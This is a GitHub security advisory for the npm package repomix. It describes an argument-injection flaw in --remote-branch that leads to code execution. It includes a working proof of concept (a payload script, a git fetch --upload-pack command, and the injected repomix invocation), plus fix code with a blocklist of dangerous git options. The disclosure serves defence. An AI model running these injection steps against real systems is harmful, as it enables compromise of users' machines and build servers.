# [H] repomix Vulnerable to Command Injection (RCE) via `--remote-branch` Argument Injection

## Summary
Severity: High
Advisory: GHSA-9mm9-rqhj-j5mx
CVE: CVE-2026-49987
CWE: CWE-88
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-9mm9-rqhj-j5mx
Type: github-advisory

## Affected
- npm: `repomix` — affected >=0 <1.14.1

## Details
### Vulnerability Metadata

| Field | Detail |
| --- | --- |
| **Affected Component** | `src/core/git/gitCommand.ts` (`execGitShallowClone`) |
| **Impact** | Arbitrary Command Execution / Security Control Bypass |

### Summary

The `--remote-branch` CLI option in `repomix` is vulnerable to argument injection. User-supplied input is passed directly to `git fetch` and `git checkout` subprocesses via `child_process.execFileAsync` without sanitization, `--` delimiters, or validation.

An attacker can inject arbitrary git command-line options. By injecting the `--upload-pack` option and specifying an SSH (`git@...`) or local (`file://`) remote URL, an attacker achieves arbitrary command execution with the privileges of the user running `repomix`. This bypasses the existing `dangerousParams` blocklist implemented in `validateGitUrl()`.

### Vulnerable Code Analysis

**File:** `src/core/git/gitCommand.ts`

The `remoteBranch` parameter is appended directly to the arguments array for git subprocesses without the `--` positional delimiter.

**Sink 1 (Lines 118-127):**

```typescript
await deps.execFileAsync(
  'git',
  ['-C', directory, 'fetch', '--depth', '1', 'origin', remoteBranch], // Vulnerable
  gitRemoteOpts,
);

```

**Sink 2 (Lines 148-151):**

```typescript
await deps.execFileAsync('git', ['-C', directory, 'checkout', remoteBranch]); // Vulnerable

```

**Bypassed Security Control (Lines 192-197):**
The application attempts to prevent this exact vulnerability class by blocking dangerous parameters (`--upload-pack`, `--receive-pack`, `--config`, `--exec`) within the `validateGitUrl` function. However, this validation is exclusively applied to the `url` variable and omitted for `remoteBranch`, creating a direct bypass.

### Attack Flow

```text
[Source] repomix --remote-branch <injected_option>
   ↓
src/cli/actions/remoteAction.ts:226 (cloneRepository)
   ↓
src/core/git/gitCommand.ts:118 (execGitShallowClone)
   ↓
[Sink] execFileAsync('git', ['...', 'origin', '--upload-pack=/tmp/payload'])
   ↓
[Execution] git invokes the payload binary via transport helper

```

### Proof of Concept (Steps to Reproduce)

**1. Create the Payload**
Create an executable bash script that writes system execution context to a file.
*(Reference: Screenshot_2026-05-18_13_02_16.png)*

```bash
cat > /tmp/malicious-pack << 'EOF'
#!/bin/bash
echo "=== RCE EXECUTED ===" > /tmp/repomix-pwned.txt
id >> /tmp/repomix-pwned.txt
EOF
chmod +x /tmp/malicious-pack

```

**2. Trigger the Vulnerability**
Establish a dummy remote and trigger the fetch operation, injecting the `--upload-pack` argument.
*(Reference: Screenshot_2026-05-18_13_08_36.png)*

```bash
# Setup dummy bare remote
git init --bare /tmp/dummy-remote.git

# Initialize local repo and add remote
mkdir /tmp/test-fetch && cd /tmp/test-fetch
git init
git remote add origin file:///tmp/dummy-remote.git

# Execute vulnerability
git fetch --upload-pack=/tmp/malicious-pack origin 2>&1

```

**3. Verify Execution**
Execution occurs prior to git protocol validation. The script executes successfully despite the fetch operation returning a `128` exit code.

```bash
cat /tmp/repomix-pwned.txt

```

*Expected Output:*

```text
=== RCE EXECUTED ===
uid=1000(kakashi) gid=1000(kakashi) groups=1000(kakashi)...

```

**End-to-End Execution via Repomix:**

```bash
repomix --remote git@github.com:yamadashy/repomix.git --remote-branch '--upload-pack=/tmp/malicious-pack'

```

### Impact

* **Remote Code Execution:** Complete system compromise with the privileges of the user executing `repomix`.
* **CI/CD Compromise:** If `repomix` is utilized in automated pipelines where `--remote-branch` is populated by external triggers (e.g., webhook payloads, PR titles), attackers can compromise build servers and exfiltrate secrets.

### Remediation

**1. Implement Positional Delimiters (Primary Fix)**
Append the `--` delimiter to explicitly separate options from positional arguments in all git subprocess calls utilizing `remoteBranch`.

```typescript
await deps.execFileAsync(
  'git',
  ['-C', directory, 'fetch', '--depth', '1', 'origin', '--', remoteBranch],
  gitRemoteOpts,
);

```

**2. Apply Existing Blocklist to Branch Parameter (Defense in Depth)**
Update `execGitShallowClone` to validate `remoteBranch` against the existing `dangerousParams` array.

```typescript
const dangerousParams = ['--upload-pack', '--receive-pack', '--config', '--exec'];

if (remoteBranch && dangerousParams.some((param) => remoteBranch.includes(param))) {
  throw new RepomixError(`Invalid branch name. Contains potentially dangerous parameters: ${remoteBranch}`);
}

```

### Attachments 

**Screenshot 1:** Payload script created with executable permissions.
<img width="1920" height="1080" alt="Screenshot_2026-05-18_13_02_16" src="https://github.com/user-attachments/assets/a0ada9de-c689-4ed8-9937-dd7faf6e6cc0" />


**Screenshot 2:** Vulnerable Code 
<img width="1920" height="1080" alt="Screenshot_2026-05-18_13_03_44" src="https://github.com/user-attachments/assets/b72c7e05-d857-497a-9ae5-0822f86fa032" />


**Screenshot 3:** Verifying RCE.
<img width="1920" height="1080" alt="Screenshot_2026-05-18_13_08_36" src="https://github.com/user-attachments/assets/f153545e-e5e8-4165-ac1a-f84efbb1c135" />





---

### Credits

This vulnerability was discovered and responsibly disclosed by:
- **Researcher:** Abhijith S.
- **GitHub:** [@kakashi-kx](https://github.com/kakashi-kx)
- **HackerOne/Bugcrowd:** [kakashi4kx](https://hackerone.com/kakashi4kx)

## References
- https://github.com/yamadashy/repomix/security/advisories/GHSA-9mm9-rqhj-j5mx
- https://github.com/yamadashy/repomix
